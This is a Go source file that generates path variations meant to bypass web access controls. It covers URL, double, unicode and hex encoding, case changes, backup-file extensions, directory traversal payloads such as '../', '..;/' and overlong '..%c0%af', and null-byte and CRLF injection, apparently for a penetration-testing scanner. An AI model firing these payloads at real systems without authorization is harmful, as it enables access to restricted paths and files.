package encoding

import (
	"fmt"
	"net/url"
	"strings"
	"unicode"
)

// PathEncodingType represents different types of path encoding
type PathEncodingType int

const (
	NoEncoding PathEncodingType = iota
	URLEncoding
	DoubleURLEncoding
	UnicodeEncoding
	HexEncoding
	MixedEncoding
)

// CaseVariationType represents different case variations
type CaseVariationType int

const (
	NoCase CaseVariationType = iota
	Uppercase
	Lowercase
	MixedCase
	RandomCase
	CamelCase
)

// EncodingBypass handles various encoding and bypass techniques
type EncodingBypass struct {
	TestPathEncoding       bool
	TestCaseVariations     bool
	TestExtensionChanges   bool
	TestDirectoryTraversal bool
	TestNullBytes          bool
}

// NewEncodingBypass creates a new encoding bypass instance
func NewEncodingBypass() *EncodingBypass {
	return &EncodingBypass{
		TestPathEncoding:       true,
		TestCaseVariations:     true,
		TestExtensionChanges:   true,
		TestDirectoryTraversal: true,
		TestNullBytes:          true,
	}
}

// GeneratePathVariations creates multiple path variations using different encoding techniques
func (eb *EncodingBypass) GeneratePathVariations(originalPath string) []string {
	var variations []string

	// Add original path
	variations = append(variations, originalPath)

	if eb.TestPathEncoding {
		variations = append(variations, eb.generateEncodedVariations(originalPath)...)
	}

	if eb.TestCaseVariations {
		variations = append(variations, eb.generateCaseVariations(originalPath)...)
	}

	if eb.TestExtensionChanges {
		variations = append(variations, eb.generateExtensionVariations(originalPath)...)
	}

	if eb.TestDirectoryTraversal {
		variations = append(variations, eb.generateTraversalVariations(originalPath)...)
	}

	if eb.TestNullBytes {
		variations = append(variations, eb.generateNullByteVariations(originalPath)...)
	}

	// Remove duplicates
	return removeDuplicates(variations)
}

// generateEncodedVariations creates variations with different encoding schemes
func (eb *EncodingBypass) generateEncodedVariations(path string) []string {
	var variations []string

	// URL encoding
	encoded := url.QueryEscape(path)
	variations = append(variations, encoded)

	// Double URL encoding
	doubleEncoded := url.QueryEscape(encoded)
	variations = append(variations, doubleEncoded)

	// Manual URL encoding for special characters
	variations = append(variations, eb.manualURLEncode(path))

	// Unicode encoding variations
	variations = append(variations, eb.unicodeEncode(path))

	// Hex encoding for specific characters
	variations = append(variations, eb.hexEncode(path))

	// Mixed encoding (some chars encoded, some not)
	variations = append(variations, eb.mixedEncode(path))

	return variations
}

// generateCaseVariations creates variations with different case patterns
func (eb *EncodingBypass) generateCaseVariations(path string) []string {
	var variations []string

	// Uppercase
	variations = append(variations, strings.ToUpper(path))

	// Lowercase
	variations = append(variations, strings.ToLower(path))

	// Mixed case patterns
	variations = append(variations, eb.alternatingCase(path))
	variations = append(variations, eb.randomCase(path))
	variations = append(variations, eb.camelCase(path))

	return variations
}

// generateExtensionVariations creates variations by adding/removing file extensions
func (eb *EncodingBypass) generateExtensionVariations(path string) []string {
	var variations []string

	commonExtensions := []string{
		".json", ".xml", ".html", ".htm", ".php", ".asp", ".aspx",
		".jsp", ".do", ".action", ".py", ".rb", ".pl", ".cgi",
		".txt", ".log", ".bak", ".old", ".tmp", ".swp",
	}

	// Add extensions
	for _, ext := range commonExtensions {
		variations = append(variations, path+ext)
	}

	// Remove extensions if path has one
	if lastDot := strings.LastIndex(path, "."); lastDot > 0 {
		withoutExt := path[:lastDot]
		variations = append(variations, withoutExt)
	}

	// Double extensions
	if strings.Contains(path, ".") {
		variations = append(variations, path+".bak")
		variations = append(variations, path+".old")
		variations = append(variations, path+".tmp")
	}

	return variations
}

// generateTraversalVariations creates directory traversal variations
func (eb *EncodingBypass) generateTraversalVariations(path string) []string {
	var variations []string

	traversalPayloads := []string{
		"../", "..\\", "..;/", "..//", "..;\\",
		"%2e%2e/", "%2e%2e\\", "%252e%252e/",
		"....//", "....\\\\", "..../",
		"..%c0%af", "..%c1%9c", "..%c0%9v",
	}

	for _, payload := range traversalPayloads {
		// Prepend traversal
		variations = append(variations, payload+path)

		// Insert in middle of path if it contains slashes
		if strings.Contains(path, "/") {
			parts := strings.Split(path, "/")
			if len(parts) > 1 {
				// Insert after first directory
				newPath := parts[0] + "/" + payload + strings.Join(parts[1:], "/")
				variations = append(variations, newPath)
			}
		}
	}

	return variations
}

// generateNullByteVariations creates null byte injection variations
func (eb *EncodingBypass) generateNullByteVariations(path string) []string {
	var variations []string

	nullBytes := []string{
		"%00", "%0a", "%0d", "%09", "%20",
		"\x00", "\n", "\r", "\t",
	}

	for _, nullByte := range nullBytes {
		// Append null byte
		variations = append(variations, path+nullByte)

		// Insert null byte before extension
		if lastDot := strings.LastIndex(path, "."); lastDot > 0 {
			withNullByte := path[:lastDot] + nullByte + path[lastDot:]
			variations = append(variations, withNullByte)
		}
	}

	return variations
}

// manualURLEncode performs manual URL encoding with specific patterns
func (eb *EncodingBypass) manualURLEncode(path string) string {
	var result strings.Builder

	for _, char := range path {
		switch char {
		case '/':
			result.WriteString("%2f")
		case '\\':
			result.WriteString("%5c")
		case '.':
			result.WriteString("%2e")
		case ' ':
			result.WriteString("%20")
		case '?':
			result.WriteString("%3f")
		case '&':
			result.WriteString("%26")
		case '=':
			result.WriteString("%3d")
		default:
			result.WriteRune(char)
		}
	}

	return result.String()
}

// unicodeEncode creates unicode encoded variations
func (eb *EncodingBypass) unicodeEncode(path string) string {
	var result strings.Builder

	for _, char := range path {
		if char > 127 {
			result.WriteString(fmt.Sprintf("%%u%04x", char))
		} else {
			result.WriteRune(char)
		}
	}

	return result.String()
}

// hexEncode creates hex encoded variations for specific characters
func (eb *EncodingBypass) hexEncode(path string) string {
	var result strings.Builder

	for _, char := range path {
		switch char {
		case '/':
			result.WriteString("\\x2f")
		case '\\':
			result.WriteString("\\x5c")
		case '.':
			result.WriteString("\\x2e")
		default:
			result.WriteRune(char)
		}
	}

	return result.String()
}

// mixedEncode creates mixed encoding (some chars encoded, some not)
func (eb *EncodingBypass) mixedEncode(path string) string {
	var result strings.Builder
	encoded := false

	for _, char := range path {
		if char == '/' || char == '.' {
			if !encoded {
				result.WriteString(url.QueryEscape(string(char)))
				encoded = true
			} else {
				result.WriteRune(char)
				encoded = false
			}
		} else {
			result.WriteRune(char)
		}
	}

	return result.String()
}

// alternatingCase creates alternating uppercase/lowercase
func (eb *EncodingBypass) alternatingCase(path string) string {
	var result strings.Builder
	upper := true

	for _, char := range path {
		if unicode.IsLetter(char) {
			if upper {
				result.WriteRune(unicode.ToUpper(char))
			} else {
				result.WriteRune(unicode.ToLower(char))
			}
			upper = !upper
		} else {
			result.WriteRune(char)
		}
	}

	return result.String()
}

// randomCase creates a pseudo-random case pattern
func (eb *EncodingBypass) randomCase(path string) string {
	var result strings.Builder

	for i, char := range path {
		if unicode.IsLetter(char) {
			// Use position as pseudo-random seed
			if i%3 == 0 {
				result.WriteRune(unicode.ToUpper(char))
			} else {
				result.WriteRune(unicode.ToLower(char))
			}
		} else {
			result.WriteRune(char)
		}
	}

	return result.String()
}

// camelCase creates camelCase variation
func (eb *EncodingBypass) camelCase(path string) string {
	var result strings.Builder
	capitalizeNext := false

	for _, char := range path {
		if char == '/' || char == '_' || char == '-' {
			result.WriteRune(char)
			capitalizeNext = true
		} else if unicode.IsLetter(char) {
			if capitalizeNext {
				result.WriteRune(unicode.ToUpper(char))
				capitalizeNext = false
			} else {
				result.WriteRune(unicode.ToLower(char))
			}
		} else {
			result.WriteRune(char)
		}
	}

	return result.String()
}

// removeDuplicates removes duplicate strings from slice
func removeDuplicates(strings []string) []string {
	keys := make(map[string]bool)
	var result []string

	for _, str := range strings {
		if !keys[str] {
			keys[str] = true
			result = append(result, str)
		}
	}

	return result
}
